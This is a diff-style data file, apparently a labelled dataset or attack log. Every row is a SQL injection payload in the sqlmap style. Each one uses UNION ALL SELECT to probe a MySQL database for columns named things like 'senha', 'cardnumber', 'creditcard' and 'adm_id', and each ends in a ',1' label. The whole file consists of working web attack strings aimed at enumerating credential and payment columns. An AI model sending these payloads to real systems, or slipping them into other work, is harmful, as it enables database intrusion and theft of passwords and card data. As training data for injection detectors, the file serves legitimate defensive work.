+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adm_nivel FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aQcJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT lec_codigo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- STvt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT per_codigo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- udZv",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT lec_disciplina FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Mfhx",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT gaip_codigo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Umnd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT acl_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OYqm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT niv_codigo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RyZX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT quantidade FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- inxE",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT attribute_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zEkC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT gaia_codigo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NWAv",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT alu_matricula FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UpCH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nota FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pZbp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT gab_codigo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lpxd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT field_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FNpJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ava_codigo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GVyY",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT aal_codigo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OVlr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT message_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OqLe",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT avi_codigo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FpOj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT fre_disciplina FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VvcT",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT groups_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZmOd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nome_cliente FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EKoY",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pc FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WWNl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT lec_professor FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lmQG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT idusuario FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wuhV",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT poll_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HcyS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dis_codigo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IcTs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ava_disciplina FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Bybr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT gap_codigo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MTUd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT avp_codigo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nnYF",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT aai_codigo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iXmk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT fre_aluno FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- smJU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT fre_codigo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kJPE",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adm_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YQaz",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id_estado FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gylX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT aap_codigo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hZWH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pro_matricula FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VYfP",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT gp FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NfPn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xlancamento FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gAzG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT municipioprestador FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YVFb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT product_price_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WxxG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT country_2_code FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lhtR",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT shopper_group_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HRee",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT manufacturer_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UlxX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT com_natur FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gotZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT review_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- urZg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xtipo_de_acao FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bwJw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT bookmark_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QdsT",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xequipe_padrao FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JvbD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT faixas_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xpDn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xcliente FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DJTY",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT deducoes_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NfwA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xcategoria FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RGtC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xencerramento FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hOvU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT idx_item FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eYLq",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xcadastro FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- goHB",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT quantitens FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Srmz",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT additional_htmlblob_users_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bmju",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ipi FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aHjj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xfase_de_vencimento FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TSUV",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT permission_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lzTW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xdecisao FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Uczo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT i_end FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZEAR",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xforo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Hfmi",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT order_item_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QXRr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zuAK",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT grafica_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jTNo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT news_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tpUm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT enderecos_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oLFX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT desccompensa FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xemW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT desconto FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SByb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT creditcard_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UNJz",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT card_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tzGl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cardid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LqVB",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT idcard FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BSYD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT creditcard FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qtcI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cardnumber FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XOfP",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cardno FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Zcja",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT itens_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JVHN",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT senha FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mgXA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT order_status_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wjQB",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id_seq FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pEtH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT municipio_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HUvP",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT additional_users_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lDQY",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT order_status_history_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zKTm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT function_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WRst",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT controladas_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IBHH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ator_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cRba",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT shipping_rate_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CLAP",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT htmlblob_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PaCR",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT css_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VEly",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xfase FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qMQS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT fieldvalueid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TAvg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT main FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bMTm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT correcaostrategy_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YCLV",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT fonte FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VpVW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xmetodo_atualizacao FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iWGT",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT desd_xdecisao FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rxbQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT jurosstrategy_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ugpN",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT fielddef_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xGVc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT especie_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XmxW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT idcategoria FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- REif",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xgrupo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yjfr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT indice_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dZQE",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xprocedimento FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VXXr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xcustom1 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dfsA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT autor_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lEZa",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT newssummarycategory FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sUba",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT icmsinterno FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Wdxq",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nonnavigable FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DTLG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT domicilio_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SKpT",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT notafiscal_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WRld",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT shipping_carrier_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fcMZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT municipiotomador FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yEwC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT natureza FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iDuo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT solicitante_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wdGD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mbpp FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CSBi",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xcustom2 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uuwg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT template_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QEpr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT chave_primaria FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lsyJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT desd_xforo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rmjm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT payment_method_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ydkv",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nome_agencia FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sYpj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pessoa_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eZHy",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT uprdescricao FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GuQm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT export_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- keVp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT logo_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QHuM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT prazo_xevento FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FGmh",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tomador_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RZDn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT serie_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DzGr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tidclasfiscais FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XEDt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT atividades_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XRpw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT logradouro_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ctpQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xadvogado FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gyWl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xequipe FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MhrZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT handler_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Lwae",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xobjeto FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- teSu",1
